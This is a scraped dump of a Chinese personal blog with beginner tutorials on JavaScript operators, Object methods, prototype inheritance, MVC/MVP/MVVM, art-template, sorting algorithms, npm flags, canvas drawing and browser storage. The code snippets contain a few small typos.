运算符instanceof运算符希望左操作数是一个对象，右操作数标识对象的类，如果左侧的对象是右侧类的实例，则返回true，否则返回false 1234var d = new Date();d instanceof Date; // true，d是由Date()创建的d instanceof Object; // true,所有对象都是Object实例d instanceof Number; // false, d不是Number的实例 逻辑表达式逻辑运算符是进行布尔运算使用的，主要有 &amp;&amp; 逻辑与 || 逻辑或 ! 逻辑非 逻辑与(&amp;&amp;)当操作数都是布尔值时，&amp;&amp;对两个值进行布尔与操作，第一个与第二个操作数都是true时，才返回true，其中一个是false，就会返回false 当操作数不都是布尔值时，&amp;&amp;不一定会返回布尔值。 逻辑与运算符，首先计算左侧的值，如果计算结果是假植，则整个表达式都是假植，因此会简单的返回左侧操作数的值 如果左侧值是真值，那么整个表达式结果依赖于右侧的值，因此，&amp;&amp;运算符符会计算右侧操作数的值，并且将其返回作为整个表达式的计算结果 1234var o =&#123; x:1 &#125;;var p = null;o &amp;&amp; o.x; // =&gt;1 ，o对象是真值，返回o.xp &amp;&amp; p.x; // =&gt; null ，p是假值，将其返回，不会计算p.x 上面那种行为，被称为 短路,这一特性非常有用，可以选择性执行代码。 例如：if ( a == b ) stop(); 等价于 ( a == b ) &amp;&amp; stop(); 逻辑或(||)当操作数都是布尔值时，||对两个操作数作布尔或运算，两个操作数有一个为真，返回true，两个操作数都是假，才会返回false 当操作数不都是布尔值，||不一定返回布尔值 逻辑或运算符，首先计算左侧的值，如果计算结果是真值，则整个表达式都是真值，因此会返回这个真值 否则再计算第二个操作数的值，再返回这个表达式的计算结果 ||同样是非常有用，比如从一组备选表达式中选出第一个真值表达式。这种做法经常在函数体内，给参数提供默认值 1var max = max_width || preference.max_width || 500; 逻辑非(!)! 运算符是一元运算符，放在一个单独的操作数前，对操作数布尔值进行求反 !运算符首先将操作数转换为布尔值，再进行求反，最终只会返回true或者false 作为一元运算符，优先级非常高，并且和操作数密切绑定。德摩根公式: 12!(p &amp;&amp; q) === !p || !q!(p || q) === !p &amp;&amp; !q 赋值表达式js 使用=运算符给变量或者属性进行赋值 12i = 0;0.x = 1; 除了常规的赋值运算符，还有一些带赋值操作的运算符+=,-=,*=,&amp;=等等只有+=可以用于数字或字符串连接，其他都偏向于数值操作 123456a = 10;b = '1';a += 10; // =&gt; 10 + 10 =20b += 10; // =&gt; '1'+10 = \"110\"a -= 10; // =&gt; 20 - 10 = 10b -= 10; // =&gt; 110 - 10 = 10 表达式计算js可以通过eval()来动态判断源代码中的字符串，并且执行 eval()只有一个参数，如果传入的参数不是字符串，直接返回这个参数。如果参数是字符串，则会把字符串当成代码进行编译。如果编译失败，则返回一个语法错误异常。如果编译成功，则会执行这段代码，并且返回字符串最后一个表达式或者语句的值。如果最后一个表达式或语句没有值，则最终返回undefined eval()使用来调用它的变量作用域环境，也就是说查找变量会和局部作用域代码完全一样。 如果将eval()重命名为其他方式来调用，则使用全局对象作为上下文作用域，并且无法读、写、定义局部变量 123456789101112131415var geval = eval; // geval 是调用全局evalvar x = \"global\";var y = \"global\";function f()&#123; var x = \"local\"; // 定义局部变量 x，局部作用域x ＝ “local” eval(\"x+='changed';\"); // 直接eval更改局部变量x的值 return x; // 返回更改后的x值&#125;function g()&#123; var y = \"local\"; // 定义局部变量 y，局部作用域y ＝ “local” geval(\"y+='changed';\"); // 间接调用改变全局变量的值 return y; // 返回为更改的局部变量&#125;console.log(f(),x); // 更改来局部变量，输出\"localchanged global\"console.log(g(),y); // 更改全局变量，输出“local globalchanged” 其他运算符条件运算符（?:）条件运算符是唯一一个三元运算符(---1---) ? (---2---) : (---3---) 第一个操作数当成布尔值，如果是真值，那么计算第二个操作数，并返回结果。否则如果第一个操作数是假植，那么计算第三个数，返回计算结果 1x &gt; 0 ? x : -x // 求x的绝对值 typeof运算符delete运算符delete运算符，用来删除对象属性或者数组元素 1234567var o = &#123; x:1, y:2&#125;;delete o.x; // 删除一个属性\"x\" in o; // false，o对象中不存在属性xvar a = [1,23,4];delete a[2]; //删除第三个元素2 in a ; // false, 索引2的元素在数组中已经不存在 delete删除成功会返回true。然后不是所有属性都可删除的 一些内置核心和客户端属性是不能删除的 使用var语句生声明的变量不能删除 通过function定义的函数和函数参数不能删除。 12345678910var 0 = &#123; x:1, y:2&#125;;delete o.x; // true, 删除对象属性成功typeof o.x; // undefined ， 属性不存在delete o.x; // true, 删除不存在的属性，返回truedelete o; // false ，不能删除var声明变量delete 1; // true, 参数不是一个左值，返回truethis.x = 1; // 定义全局对象的一个属性delete x; // 试图删除全局变量的属性，非严格模式下，返回truex; // 运行时错误，没有定义x void 运算符void 是一元运算符，操作数照常计算，但是忽略计算结果并且返回undefined 这个操作符经常用作客户端URL－javascript:URL,通过使用void则让浏览器不必显示这个表达式计算结果 1&lt;a href=\"javascript:void window.open();\"&gt;打开一个新窗口&lt;/a&gt; 逗号运算符逗号运算符，首先计算左操作数，然后计算右操作数，最后返回右操作数的值。 总会计算左侧的表达式，但计算结果忽略掉，也就是说，只有左侧表达式有副作用时，，才会使用逗号表达式让代码更通顺。 经常在for循环中使用 123for(var i=0,j=10;i&lt;j;i++,j--)&#123; console.log(i+j);&#125; 文／zhaolion（简书作者）原文链接：http://www.jianshu.com/p/ff845f40f036著作权归作者所有，转载请联系作者获得授权，并标注“简书作者”。","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"Object全局方法","date":"2016-07-17T04:58:48.000Z","path":"2016/07/17/Object全局方法/","text":"Object.defineProperty属性12345678910111213141516171819202122var obj = &#123;name: \"张三\"&#125;; obj.age = 20; //name属性是可读可写可删除可遍历，值可以是任意类型的值 // delete obj.name;//删除name属性 //可遍历：可以适应forin循环遍历出来的属性 // for (var key in obj) &#123; // console.log(key); // &#125; //ES5中的一个方法，不支持IE9以下版本 //功能：给对象定义一个属性 Object.defineProperty(obj, \"gender\", &#123; configurable: false,//表示该属性不可被删除 //true可以被删除 enumerable:false,//定义了一个不可被枚举的属性 //true可以被枚举 writable:false,//定义了一个不可被赋值运算符(+= -= *= /= %= = ++ --)改变的属性： //true可以改变 value: \"100\" &#125;); get12345678910var obj = &#123;name: \"张三\"&#125;; obj.age = 20; Object.defineProperty(obj,\"gender\",&#123; get:function()&#123; return 100; &#125; &#125;); //获取属性的时候，就会跑到get方法内部 console.log(obj.gender);//100 set12345678910var obj = &#123;name: \"张三\"&#125;;obj.age = 20;Object.defineProperty(obj,\"gender\",&#123; set:function(value)&#123; console.log(value); &#125;&#125;);//设置属性，就会自动进入到set方法内部obj.gender=\"男\"; get_set综合使用12345678910111213141516171819//限定了obj对象的age属性的值的范围：0-200之间(function()&#123; var _age; Object.defineProperty(obj,\"age\",&#123; set:function(value)&#123; if(value&gt;=0 &amp;&amp; value&lt;=200)&#123; _age=value; &#125; &#125;, get:function()&#123; return _age===undefined?0:_age; &#125; &#125;);&#125;)()obj.age=-1;//_age:undefinedconsole.log(obj.age);//0obj.age=10;//_age:10console.log(obj.age);//10 hasOwnProperty1234567891011121314151617181920212223//hasOwnProperty是定义在Object.prototype，所有的对象都可以访问到该方法//hasOwnProperty功能：判断参数是否是对象自身内存中定义的属性，只要自身内存中有的就是true(__proto__除外)，其他的都是falsefunction Person(name,age)&#123; this.name=name; this.age=age;&#125;Person.prototype.numbers=[1,3,5];Person.prototype.say=function()&#123;&#125;;var p1=new Person(\"张三\",20);console.log(p1.hasOwnProperty(\"name\"));//trueconsole.log(p1.hasOwnProperty(\"age\"));//true//特例：console.log(p1.hasOwnProperty(\"__proto__\"));//falseconsole.log(p1.hasOwnProperty(\"numbers\"));//falseconsole.log(Person.prototype.hasOwnProperty(\"numbers\"));//true isPrototypeOf123456789101112131415161718//isPrototypeOf功能：判断当前对象是否是参数的原型对象 // 只要参数直接继承或者间接继承自当前对象，结果就是true，其他情况，结果就是false //o1.isPrototypeOf(o2)----&gt;o2.__proto__===o1 // o2.__proto__.__proto__===o1 // o2.__proto__.__proto__.__proto__===o1 function Person(name,age)&#123; this.name=name; this.age=age; &#125; Person.prototype.numbers=[1,3,5]; Person.prototype.say=function()&#123;&#125;; var p1=new Person(\"张三\",20); console.log(Person.prototype.isPrototypeOf(p1));//true console.log(Object.prototype.isPrototypeOf(p1));//true console.log(Object.prototype.isPrototypeOf(Person.prototype));//true propertyIsEnumerable1234567891011121314151617181920212223242526272829//propertyIsEnumerable：表示属性是否是可枚举的，同时属性是自身的 function Person(name,age,gender)&#123; this.name=name; this.age=age; //定义一个不可被枚举的属性： Object.defineProperty(this,\"gender\",&#123; enumerable:false, value:gender &#125;) &#125; Object.defineProperty(Person.prototype,\"height\",&#123; enumerable:false, value:200 &#125;) Person.prototype.numbers=[1,3,5]; Person.prototype.say=function()&#123;&#125;; var p1=new Person(\"张三\",20,\"男\"); console.log(p1.propertyIsEnumerable(\"name\"));//true console.log(p1.propertyIsEnumerable(\"age\"));//true console.log(p1.propertyIsEnumerable(\"numbers\"));//false console.log(p1.propertyIsEnumerable(\"gender\"));//false //for...in循环的功能：可以遍历出对象自身以及对象的原型链中可以被枚举的属性// for (var key in p1) &#123;// console.log(key);// &#125; instanceof 主要用来检测a 是否在原型图上联系到b 大白话 123456789101112131415161718192021222324252627282930313233//A instanceof 函数B//功能1：A对象是否是B的实例function Person()&#123;&#125;var p1=new Person();//p1是Person的实例console.log(p1 instanceof Person);//true//功能2：A对象的原型链中是否涉及了B//p1的原型图：p1 Person Person.prototype Object Object.prototypeconsole.log(p1 instanceof Object);//trueconsole.log(Array instanceof Function);//true//Array的原型图：Array Function.prototype Function Object.prototype Objectconsole.log(Array instanceof Object);//true//Function的原型图：Function Function.__proto__(Function.prototype) Object Object.prototypeconsole.log(Function instanceof Object);//trueconsole.log(Function instanceof Function);//true//Object的原型图：Object Object.__proto__(Function.prototype) Object.prototypeconsole.log(Object instanceof Function);//Object.__proto__:Function.prototypeconsole.log(Object instanceof Object);//Object.__proto__.__proto__:Object.prototype//总结instanceof运算符：A instanceof 函数B//不仅仅可以检测A是B的实例 :true//还可以检测A的原型对象是B的实例:true//A的原型对象的原型对象也是B的实例：trueconsole.log(Object instanceof Object);//true//Object是Function的实例//Object.__proto__:Function.prototype是Object函数的实例：true//Function.prototype.__proto__:Object.prototype ###","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"MVC，MVP 和 MVVM 的图示","date":"2016-07-15T06:33:21.000Z","path":"2016/07/15/MVC，MVP 和 MVVM 的图示/","text":"作者： 阮一峰 日期： 2015年2月 1日 复杂的软件必须有清晰合理的架构，否则无法开发和维护。 MVC（Model-View-Controller）是最常见的软件架构之一，业界有着广泛应用。它本身很容易理解，但是要讲清楚，它与衍生的 MVP 和 MVVM 架构的区别就不容易了。 昨天晚上，我读了《Scaling Isomorphic Javascript Code》，突然意识到，它们的区别非常简单。我用几段话，就可以说清。 （题图：摄于瓦伦西亚，西班牙，2014年8月） 一、MVCMVC模式的意思是，软件可以分成三个部分。 视图（View）：用户界面。 控制器（Controller）：业务逻辑 模型（Model）：数据保存 各部分之间的通信方式如下。 View 传送指令到 Controller Controller 完成业务逻辑后，要求 Model 改变状态 Model 将新的数据发送到 View，用户得到反馈 所有通信都是单向的。 二、互动模式接受用户指令时，MVC 可以分成两种方式。一种是通过 View 接受指令，传递给 Controller。 另一种是直接通过controller接受指令。 三、实例：Backbone实际项目往往采用更灵活的方式，以 Backbone.js 为例。 \\1. 用户可以向 View 发送指令（DOM 事件），再由 View 直接要求 Model 改变状态。 \\2. 用户也可以直接向 Controller 发送指令（改变 URL 触发 hashChange 事件），再由 Controller 发送给 View。 \\3. Controller 非常薄，只起到路由的作用，而 View 非常厚，业务逻辑都部署在 View。所以，Backbone 索性取消了 Controller，只保留一个 Router（路由器） 。 四、MVPMVP 模式将 Controller 改名为 Presenter，同时改变了通信方向。 \\1. 各部分之间的通信，都是双向的。 \\2. View 与 Model 不发生联系，都通过 Presenter 传递。 \\3. View 非常薄，不部署任何业务逻辑，称为”被动视图”（Passive View），即没有任何主动性，而 Presenter非常厚，所有逻辑都部署在那里。 五、MVVMMVVM 模式将 Presenter 改名为 ViewModel，基本上与 MVP 模式完全一致。 唯一的区别是，它采用双向绑定（data-binding）：View的变动，自动反映在 ViewModel，反之亦然。Angular 和 Ember 都采用这种模式。 转载 http://www.ruanyifeng.com/blog/2015/02/mvcmvp_mvvm.html","comments":true,"tags":[{"name":"MV*","slug":"MV","permalink":"http://www.wanyifeng.top/tags/MV/"}]},{"title":"JS原型与继承","date":"2016-07-11T07:47:21.000Z","path":"2016/07/11/JS原型与继承/","text":"继承定义: 一个对象能用到另一个对象的内容 原型继承 1.给原型对象添加方法 2.替代原型对象(定义一个和原型对象一样的名字的函数) 扩展原型链实现继承 实现代码 12345678910function Porson (name)&#123; this.name = name;&#125;Porson.prototype.age= function(age)&#123; console.log(this); this.age = age;&#125;var a = new Porson(123);console.log(a);a.age(111111); 替换原型链实现继承 代码实现 12345678910111213141516171819202122232425function Porson (name)&#123; this.name = name;&#125;Porson.prototype.sayHi = function()&#123; console.log(this.name+\"您好\");&#125;var chilen1 = new Porson(\"万翼峰\");chilen1.sayHi();//万翼峰您好var obj = &#123; constructor:Porson, sayHi:function()&#123; console.log(this) console.log(this.name+\"今天你吃饭了吗\") &#125;&#125;Porson.prototype = obj;var chilen2 = new Porson(\"万翼峰\");chilen2.sayHi(); //万翼峰今天你吃饭了吗chilen1.sayHi();//万翼峰您好chilen1.__proto__.constructor.prototype.sayHi();//undefined今天你吃饭了吗//出现undefined时说明this = chilen1.__proto__.constructor.prototype 为原型 混入继承 实现代码 1234567891011121314151617181920function Porson (name)&#123; this.name = name;&#125;var obj = &#123; age:function(age)&#123; this.age = age; &#125;, gender:function(gender)&#123; this.gender = gender &#125;, exs:\"不知奥\"&#125;function extend (target,source)&#123; for(var key in source)&#123; target[key] = source[key] &#125; return target&#125;var reslut = extend(Porson.prototype,obj)console.log(reslut) 原型式继承 代码实现 12345function Porson ()&#123;&#125;var o1 = &#123;name:\"万翼峰\"&#125;Porson.prototype = o1;var o2 = new Porson();//o2继承o1 寄生继承12345678910111213141516171819202122232425262728293031323334353637383940 //这样的Person函数虽然被当成构造函数来进行调用，但是最终的返回值并不是Person的实例，把这样的构造函数称之为寄生构造函数 function porson ()&#123; var obj = &#123; name:\"张三\", gender:\"男\" &#125;// var obj = new aaa()// 这里只要一个函数的字面量就可以 return obj &#125; //p1指向一个对象字面量，并不是Person的实例 var o1 = porson(); function createAnother(original) &#123; var clone = Object.create(original); //通过调用函数创建一个新对象 clone.sayHi = function() &#123; //以某种方式来增强这个对象 alert(\"Hi\"); &#125;; return clone; //返回这个对象 &#125; var person = &#123; name: \"Bob\", friends: [\"Shelby\", \"Court\", \"Van\"] &#125;; var anotherPerson = createAnother(person); anotherPerson.sayHi();//寄生2// 外表看起来就是构造方法, 但是本质不是的构造方法创建对象的方式function createPerson( name, age, gender ) &#123; var o = &#123;&#125;; o.name = name; o.age = age; o.gender = gender; return o;&#125;var p = new createPerson( 'jim', 19, 'male' ); 借用构造函数继承12345678910111213141516171819//借用构造函数实现继承：已知构造函数A/B，如果A中的代码可以完全适用于B，只需要在B中通过上下文模式借用A function Animal(name,color,age)&#123; this.name=name; this.color=color; this.age=age; &#125; function Dog(name,color,age)&#123; //Animal构造函数中的代码正好可以完全适用于Dog构造函数 Animal.call(this,name,color,age); Animal.call(this,arguments);//高级有B格的写法// this.name=name;// this.color=color;// this.age=age; &#125; Dog.prototype.cry=function()&#123; console.log(\"cry\"); &#125; 静态成员和实例成员1234567891011121314151617//对象的成员：对象的属性和方法的总称var o1 = &#123; name: \"zhangsan\", say: function() &#123;&#125;&#125;;//name/say是o1对象的两个成员//静态成员：Person函数自身的内存中的属性，必须通过Person.xxx方式来进行访问function Person(name, age) &#123; this.name = name; this.age = age;&#125;//Person.gengder 就是静态成员Person.gengder = \"男\"//实例成员：实例的属性和方法，要访问实例成员，必须首先创建实例，再通过该实例来进行访问var p1 = new Person(\"历程\", 20); //p1具有name/age这两个实例成员 ###","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"继承","slug":"继承","permalink":"http://www.wanyifeng.top/tags/继承/"}]},{"title":"模板引擎使用","date":"2016-07-10T02:58:48.000Z","path":"2016/07/10/模板引擎/","text":"art-template 模板引擎 1234567891011121314151617181920212223242526272829&lt;script id=\"test\" type=\"text/html\"&gt; &lt;h1&gt;&#123;&#123;title&#125;&#125;&lt;/h1&gt; &lt;h2&gt;&#123;&#123;myTitle&#125;&#125;&lt;/h2&gt; &lt;h3&gt;程序员建议多吃:&#123;&#123;westFlower&#125;&#125;&lt;/h3&gt;&lt;/script&gt;&lt;script type=\"text/javascript\" src='js/template.js'&gt;&lt;/script&gt;&lt;script type=\"text/javascript\"&gt; var data = &#123; title: '标签', myTitle:'我自己的标签', westFlower:'西兰花' &#125;; // 通过标签的id 获取文本值 var text = document.querySelector('#test').innerHTML; console.log(text); // template 使我们导入了模板引擎之后 就有了 // 参数1 是script标签的 id属性 // 参数2 是 我们传入的 对象 // 内部的 逻辑是 通过正则表达式 获取 占位的 文本,然后 根据传入的对象 进行替换 var html = template('test', data); console.log(html); document.getElementById('content').innerHTML = html; 自定义合并模板 123456789101112131415&lt;!-- 定义 合并的模板 --&gt;&lt;script type=\"text/html\" id='together'&gt;&#123;&#123;if isSelf&#125;&#125; &lt;div class=\"self clearfix\"&gt; &lt;a href=\"#\" class='f_r'&gt;人&lt;/a&gt; &lt;p class='f_r'&gt;&#123;&#123;info&#125;&#125;&lt;/p&gt; &lt;/div&gt;&#123;&#123;else&#125;&#125; &lt;div class=\"robot clearfix\"&gt; &lt;a href=\"#\" class='f_l'&gt;机&lt;/a&gt; &lt;p class='f_l'&gt;&#123;&#123;text&#125;&#125;&lt;/p&gt; &lt;/div&gt;&#123;&#123;/if&#125;&#125;&lt;/script&gt;//使用时给data对象添加isSelf属性 当isSelf属性为true时走的是上面的逻辑 为false是走下面的模板 模板循环 12345678910&lt;script type=\"text/html\" id='eachObj'&gt; &#123;&#123;each persons as value index&#125;&#125; &lt;h1&gt;person&#123;&#123;index&#125;&#125;号&lt;/h1&gt; &lt;p&gt;&#123;&#123;value.name&#125;&#125;&lt;/p&gt; &lt;p&gt;&#123;&#123;value.skill&#125;&#125;&lt;/p&gt; &lt;p&gt;&#123;&#123;value.age&#125;&#125;&lt;/p&gt; &#123;&#123;/each&#125;&#125;&lt;/script&gt; //循环遍历persons对象 快速上手 编写模板 123456789&lt;-使用一个type=\"text/html\"的script标签存放模板-&gt;&lt;script id=\"test\" type=\"text/html\"&gt;&lt;h1&gt;&#123;&#123;title&#125;&#125;&lt;/h1&gt;&lt;ul&gt; &#123;&#123;each list as value i&#125;&#125; &lt;li&gt;索引 &#123;&#123;i + 1&#125;&#125; ：&#123;&#123;value&#125;&#125;&lt;/li&gt; &#123;&#123;/each&#125;&#125;&lt;/ul&gt;&lt;/script&gt; 渲染模板 1234var data = &#123; title: '标签', list: ['文艺', '博客', '摄影', '电影', '民谣', '旅行', '吉他']&#125;; 12var html = template('test', data);document.getElementById('content').innerHTML = html; 方法12345678910111213141516171819202122 template(id, data)根据 id 渲染模板。内部会根据`document.getElementById(id)`查找模板。如果没有 data 参数，那么将返回一渲染函数。template.`compile`(source, options)将返回一个渲染函数。 template.`render`(source, options)将返回渲染结果。template.`helper`(name, callback)添加辅助方法。例如时间格式器： template.`config`(name, value) 使用预编译可突破浏览器限制，让前端模板拥有后端模板一样的同步“文件”加载能力： 一、按文件与目录组织模板 1template('tpl/home/main', data) 二、模板支持引入子模板 1&#123;&#123;include '../public/header'&#125;&#125;","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"排序算法","date":"2016-07-05T03:53:21.000Z","path":"2016/07/05/js数组的排序/","text":"选择排序1234567891011121314151617181920var selectSort = function (arr) &#123;a var min; for (var i = 0; i &lt; arr.length-1; i++) &#123; min = i; for (var j = i + 1; j &lt; arr.length; j++) &#123; if (arr[min] &gt; arr[j]) &#123; min = j; &#125; &#125; if (i != min) &#123; swap(arr, i, min); &#125; console.log(i+1, \": \" + arr); &#125;&#125;;function swap(arr, index1, index2) &#123; var temp = arr[index1]; arr[index1] = arr[index2]; arr[index2] = temp;&#125;; 对比数组中前一个元素跟后一个元素的大小，如果后面的元素比前面的元素小则用一个变量k来记&gt;住他的位置，接着第二次比较，前面“后一个元素”现变成了“前一个元素”，继续跟他的“后一个元&gt;素”进行比较如果后面的元素比他要小则用变量k记住它在数组中的位置(下标)，等到循环结束的时候，我们应该找到了最小的那个数的下标了，然后进行判断，如果这个元素的下标不是第一个元素的下标，就让第一个元素跟他交换一下值，这样就找到整个数组中最小的数了。然后找到数组中第&gt;二小的数，让他跟数组中第二个元素交换一下值，以此类推。 ###插入排序 123456789101112131415var insertSort = function (arr) &#123; var len = arr.length, key; for (var i = 1; i &lt; len; i++) &#123; var j = i; key = arr[j]; while (--j &gt; -1) &#123; if (arr[j] &gt; key) &#123; arr[j + 1] = arr[j]; &#125; else &#123; break; &#125; &#125; arr[j + 1] = key; &#125;&#125;; 插入排序的基本思想是：每步将一个待排序的纪录，按其关键码值的大小插入前面已经排序的文件&gt;中适当位置&gt;上，直到全部插入完为止。 冒泡排序123456789101112131415161718var bubbleSort = function (arr) &#123; var flag = true; var len = arr.length; for (var i = 0; i &lt; len - 1; i++) &#123; flag = true; for (var j = 0; j &lt; len - 1 - i; j++) &#123; if (arr[j] &gt; arr[j + 1]) &#123; var temp = arr[j+1]; arr[j+1] = arr[j]; arr[j] = temp; flag = false; &#125; &#125; if (flag) &#123; break; &#125; &#125;&#125;; 快速排序1234567891011121314151617181920212223242526var quickSort = function(arr, left, right) &#123; var i, j, t, pivot; if (left &gt;= right) &#123; return; &#125; pivot = arr[left]; i = left; j = right; while (i != j) &#123; while (arr[j] &gt;= pivot &amp;&amp; i &lt; j) &#123; j--; &#125; while (arr[i] &lt;= pivot &amp;&amp; i &lt; j) &#123; i++; &#125; if (i &lt; j) &#123; t = arr[i]; arr[i] = arr[j]; arr[j] = t; &#125; &#125; arr[left] = arr[j]; arr[j] = pivot; quickSort(arr, left, i - 1); quickSort(arr, i + 1, right);&#125; (1) 设置两个变量i、j，排序开始的时候：i=0，j=N-1；(2）以第一个数组元素作为关键数据，赋值给key，即key=A[0]；(3）从j开始向前搜索，即由后开始向前搜索(j–)，找到第一个小于key的值A[j]，将A[j]和A[i]互换；(4）从i开始向后搜索，即由前开始向后搜索(i++)，找到第一个大于key的A[i]，将A[i]和A[j]互换；(5）重复第3、4步，直到i=j； (3,4步中，没找到符合条件的值，即3中A[j]不小于key,4中A[i]不大于key的时候改变j、i的值，使得j=j-1，i=i+1，直至找到为止。找到符合条件的值，进行交换的时候i， j指针位置不变。另外，i==j这一过程一定正好是i+或j-完成的时候，此时令循环结束）。 js原生Array方法1234567var numbers = [4, 2, 5, 1, 3];numbers.sort(function(a, b) &#123; return a - b;&#125;);console.log(numbers);// [1, 2, 3, 4, 5] 如果调用该方法时没有使用参数，将按字母顺序对数组中的元素进行排序，说得更精确点，是按照字符编码的顺序进行排序。要实现这一点，首先应把数组的元素都转换成字符串（如有必要），以便进行比较。 如果想按照其他标准进行排序，就需要提供比较函数，该函数要比较两个值，然后返回一个用于说明这两个值的相对顺序的数字。比较函数应该具有两个参数 a 和 b，其返回值如下： 若 a 小于 b，在排序后的数组中 a 应该出现在 b 之前，则返回一个小于 0 的值。 若 a 等于 b，则返回 0。 若 a 大于 b，则返回一个大于 0 的值。 可以采用数组的 charcodeAt() 进行转成符编码 进行排序","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"}]},{"title":"--save 和 --save -dev的区别","date":"2016-06-15T02:13:45.000Z","path":"2016/06/15/--save 和 --save -dev的区别/","text":"--save是对生产环境所需依赖的声明(开发应用中使用的框架，库),--save-dev是对开发环境所需依赖的声明(构建工具，测试工具).正常使用npm install时，会下载dependencies和devDependencies中的模块，当使用npm install --production或者注明NODE_ENV变量值为production时，只会下载dependencies中的模块。 --save是生产环境 --save -dev是开发环境 当存在package.json时 npm install –production 安装生产时的模块就不会安装测试的模块 npm install 会安装全部的模块,包括生产和调试模块","comments":true,"tags":[{"name":"构建工具","slug":"构建工具","permalink":"http://www.wanyifeng.top/tags/构建工具/"}]},{"title":"canvas入门","date":"2016-06-08T03:13:21.000Z","path":"2016/06/08/canvas/","text":"canvas标签 注意需要在属性中写宽度高度在css中写不会改变像素数量只会改变像素大小 getContextcanvas的上下文 12var vanvas = document.querySelector(\"canvas\"), ctx = canvas.getContext(\"2d\"); ##实线相关 ctx.moveTo(50,50) 定义起点 ctx.lineTo(100,100) 绘制直线 ctx.closePath() 自动闭合标签 只有描边时使用 ctx.strokeStyle //描边的颜色 ###ctx.lineWidth = 2 线宽 线宽 = 2时 从线中间向两边各扩展1px 线宽 = 3 是 从线中间向外面扩展2px 其中最外面的是虚影 注意: 宽度 = 奇数的时候会向两边产生虚线 ctx.stroke() 开始描边 ##ctx.beginPath() 开辟新的状态 特点：会忘记之前状态中绘制的轨迹特点2：在开辟新状态之后，如果没有重新设置绘制的起点，那么第一次的lineTo相当于moveTo 虚线ctx.setLineDash([10,2,10,1,1]) 设置虚线 数组length为奇数会自动补齐为偶数[10,2,10,1,1,10,2,10,1,1] 奇数位置为实线部分 偶数部分为虚线 通过数组循环输出虚线类型 ctx.getLineDash() 获取补齐后的数组 单数是才会补齐 偶数是返回原数组 ctx.lineDashOffset = 10 虚线偏移向左 为正数的情况下 虚线偏移向右 如果偏移的位置超过实线部分那就表现虚线部分 线的线帽处理12ctx.lineCap = \"round\" //线的两端变成半圆ctx.lineCap = \"square\" // 线的两端变成方块 鸡肋方法 线的连接处理12ctx.lineJoin = \"round\" //线的连接处变成圆角ctx.lineJoin = \"bevel\" //线的连接处直接砍掉 填充ctx.fill() 填充 不用再次调用closePath方法 相当于内部自己调用了该方法 ctx.fillStyle = “red” 填充颜色 绘制矩形123ctx.strokeRect(x,y,width,height)//线绘制ctx.fillRect(x,y,width,height)//填充绘制ctx.rect(x,y,width,height)//只是绘制不做操作 清除画布 清除矩形区域画布 前两个参数为起始位置 后两个参数为宽高 1ctx.clearRect(0,0,200,200) 文本ctx.font 文字的大小 和字体 1ctx.font = \"50px 微软雅黑\" ###ctx.textAlign 文字的水平对其方式 1ctx.textAlign = \"center left height\" ctx.textBaseline 文字的垂直对齐方式 1ctx.textBaseline = \"middle\" ctx.fillText() 填充字体 制定颜色为 ctx.fillStyle = “red” ctx.strokeText() 字体描边 制动颜色 ctx.strokeStyle ctx.measureText(text) 测量文字大小 text 为被测文字 绘制图片123456789101112 ctx.drawImage(img,x,y); //参数类型1 ctx.drawImage(img,x,y,width,height);//参数类型2 ctx.drawImage(img,sx,sy,swidth,sheight,x,y,width,height);//参数类型3// img 规定要使用的图像、画布或视频。// sx 开始剪切的 x 坐标位置。// sy 开始剪切的 y 坐标位置。// swidth 被剪切图像的宽度。// sheight 被剪切图像的高度。// x 在画布上放置图像的 x 坐标位置。// y 在画布上放置图像的 y 坐标位置。// width 要使用的图像的宽度。（伸展或缩小图像）// height 要使用的图像的高度。（伸展或缩小图像） ctx.arc(x,y,r,sAngle,eAngle,true) 绘制弧线 //x:开始坐标 y:开始坐标 r:半径 sAngle:弧度开始 eAngle: 弧度结束 true :为顺时针 弧度单位为Math.PI 状态栈1234ctx.save()//保存状态ctx.save()//保存状态ctx.restore()//修复状态 第二次save的内容ctx.restore()//修复状态 第一次save的内容 先进后出 变换123ctx.translate(x,y)// 改变坐标系的起点坐标ctx.rotate(弧度) // 改变坐标系的xY轴的方向ctx.scale(0.5,0.5) //把坐标系的xy缩短为原来的一半 透明度1ctx.globalAlpha = 0.2 透明度取值为0-1 获取所有像素点1ctx.getImageData(0,0,canvas.width,canvas.height).data 获取的数组每4个数组代表一个像素点 r255g255b255 透明度 255 255为最大=&gt;1 ##globalCompositeOperation source-over 默认。在目标图像上显示源图像。 source-atop 在目标图像顶部显示源图像。源图像位于目标图像之外的部分是不可见的。 source-in 在目标图像中显示源图像。只有目标图像内的源图像部分会显示，目标图像是透明的。 source-out 在目标图像之外显示源图像。只会显示目标图像之外源图像部分，目标图像是透明的。 destination-over 在源图像上方显示目标图像。 destination-atop 在源图像顶部显示目标图像。源图像之外的目标图像部分不会被显示。 destination-in 在源图像中显示目标图像。只有源图像内的目标图像部分会被显示，源图像是透明的。 destination-out 在源图像外显示目标图像。只有源图像外的目标图像部分会被显示，源图像是透明的。 lighter 显示源图像 + 目标图像。 copy 显示源图像。忽略目标图像。 xor 使用异或操作对源图像与目标图像进行组合","comments":true,"tags":[{"name":"js","slug":"js","permalink":"http://www.wanyifeng.top/tags/js/"},{"name":"canvas","slug":"canvas","permalink":"http://www.wanyifeng.top/tags/canvas/"}]},{"title":"本地存储","date":"2016-05-25T06:33:21.000Z","path":"2016/05/25/本地存储/","text":"cookie ​ 当你在浏览网站的时候，WEB 服务器会先送一小小资料放在你的计算机上，Cookie 会帮你在网站上所打的文字或是一些选择， ​ 都纪录下来。当下次你再光临同一个网站，WEB 服务器会先看看有没有它上次留下的 Cookie 资料，有的话，就会依据 Cookie里的内容来判断使用者，送出特定的网页内容给你。 Cookie 的使用很普遍， 1、cookie数据存放在客户的浏览器上，session数据放在服务器上。 2、cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗考虑到安全应当吧重要数据放在服务器session。 3、单个cookie保存的数据不能超过4K，一般一个站点最多保存20个cookie。 cookie sessionStorage localStorage 之间的关系 共同点：都是保存在浏览器端，且同源的。 